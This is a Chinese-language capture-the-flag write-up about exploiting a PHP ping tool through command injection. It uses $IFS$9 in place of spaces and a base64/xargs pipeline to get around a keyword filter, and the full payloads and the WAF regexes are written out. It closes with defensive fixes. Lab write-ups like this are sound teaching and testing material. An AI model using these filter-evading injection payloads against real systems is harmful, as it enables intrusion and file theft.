◆ 题目概览

一个ping工具：输入IP，后端执行 ping -c 4 <ip>，回显ping结果。

GET /?ip=127.0.0.1
→ PING 127.0.0.1 (127.0.0.1): 56 data bytes
  64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.058 ms
  ...

技术栈：PHP 5.6.40 + openresty，运行用户 www-data，Web目录 /var/www/html。

经典命令注入点：127.0.0.1;ls 直接列出目录——有 flag.php 和 index.php。

◆ 四层WAF：从报错信息反推规则

尝试 cat flag.php 时报错 fxck your space!，随后不同payload暴露了四类拦截信息：

报错拦截内容
fxck your space!空格 " "
fxck your symbol!& / ? * < > ' " \ ( ) [ ] { } + 控制字符 \x00-\x1f
fxck your bash!bash 关键字
fxck your flag!/.*f.*l.*a.*g.*/ 宽松正则（跨任意字符匹配）

宽松正则的玄机

逐字符测试发现 WAF 匹配的是 f → l → a → g 的顺序出现，中间允许任意字符：

flag     → 拦
fXlXaXg  → 拦（f,l,a,g顺序存在）
flXXag   → 拦
FLAG     → 不拦（大小写敏感，只拦小写！）
a=fl;b=ag → 拦（跨词匹配：fl;b=ag 中 f..l..a..g 顺序成立）

◆ 核心坑：$IFS变量名吞字母

空格用 $IFS 绕过是常识，但这里踩了个大坑：

cat$IFSindex.php  → 无输出！  cat.php（？）
echo$IFShello     → 无输出！  echo（无参数）
ls$IFS-la         → 正常！    ls -la

原因：shell 变量名的合法字符是字母/数字/下划线。$IFSindex 中 $ 后紧跟 IFSindex，整个被当作变量名去取值（不存在→空），命令悄悄变成了 cat.php！

而 $IFS-la 中 - 不是变量名字符，$IFS 正确展开。

💡 解决方案：用 $9（空位置参数）隔断—— cat$IFS$9index.php → cat index.php ✅

◆ 读源码：payload全部泄露

index.php 不含 flag 序列，直接 cat$IFS$9index.php 读出源码——WAF规则全透明：

if(preg_match("/\&|\/|\?|\*|\<|[\x00-\x1f]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip))
    die("fxck your symbol!");       // 符号
else if(preg_match("/ /", $ip))
    die("fxck your space!");        // 空格
else if(preg_match("/bash/", $ip))
    die("fxck your bash!");         // bash
else if(preg_match("/.*f.*l.*a.*g.*/", $ip))
    die("fxck your flag!");         // flag宽松正则
// ...最终 system("ping -c 4 " . $ip)

注意末尾 system() 拼接——命令注入点确认。

◆ 最终Payload：base64编码链

flag 正则跨字符匹配，任何含 f/l/a/g 顺序的写法（含变量拼接 a=fl;b=ag）都被拦。最干净的办法：base64 编码文件名，完全避开小写字母。

flag.php → base64 → ZmxhZy5waHA=

payload:
127.0.0.1;echo$IFS$9ZmxhZy5waHA=|base64$IFS$9-d|xargs$IFS$9cat

执行链:
echo ZmxhZy5waHA=          → 输出base64串
| base64 -d                → 解码为 flag.php
| xargs cat                → cat flag.php → 🏁

关键点：| 和 ;、$、= 都不在符号过滤列表里，base64 串里只有大写字母+数字，完美穿过四层WAF。

🏁 最终 flag：CTF2{***}（已按惯例脱敏）

◆ 总结与教训

攻击链回顾

  1. 注入点探测：;ls 列出目录 → 发现 flag.php
  2. 报错信息反推WAF规则（space/symbol/bash/flag四层）
  3. 空格绕过：$IFS → 踩坑 $IFS 吞字母 → 修正 $IFS$9
  4. 读 index.php 源码 → WAF正则完全泄露
  5. flag正则绕过：base64编码 + echo/base64/xargs管道链 → 读flag

可复用的通用套路

  • 报错信息是金矿：WAF拦截提示（space/symbol/bash/flag）直接泄露过滤规则分类，逐个构造payload测试比盲猜快10倍
  • 源码可读就先读源码：index.php不含敏感词时直接cat，拿到精确正则再精准绕过
  • 宽松正则用编码绕过：f.*l.*a.*g 类跨字符匹配 → base64/hex/变量都容易中招，base64编码目标字符串最干净
  • shell变量名边界：$IFS 后跟字母会被吞进变量名，一律用 $IFS$9 或 ${IFS}（若花括号可用）

防御视角

  • 命令注入的根治：白名单校验IP格式（如 filter_var(FILTER_VALIDATE_IP)），而不是黑名单过滤符号
  • escapeshellarg() 处理参数，禁止拼接
  • WAF正则用 \b 词边界+大小写不敏感，避免 .* 跨字符宽松匹配
  • flag文件不要放Web目录、不要用flag关键字命名
